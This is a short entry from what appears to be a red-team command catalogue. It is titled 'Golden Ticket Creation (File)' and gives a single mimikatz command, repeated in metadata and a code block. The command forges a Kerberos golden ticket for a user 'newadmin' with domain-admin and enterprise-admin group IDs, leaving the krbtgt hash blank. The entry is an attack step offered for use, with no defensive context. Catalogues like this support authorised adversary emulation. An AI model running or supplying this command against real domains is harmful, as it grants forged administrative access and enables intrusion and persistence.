---
id: fa5bcbad-95d0-4c75-b63f-abccc202d64b
name: Golden Ticket Creation (File)
type: command
executor: bash
data: 'mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936
  /groups:501,502,513,512,520,518,519 /krbtgt: /ticket:newadmin.tkt

  '
output: null
created_at: '2020-07-14T18:21:15.055139+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Golden Ticket Creation (File)

```bash
mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt: /ticket:newadmin.tkt

```


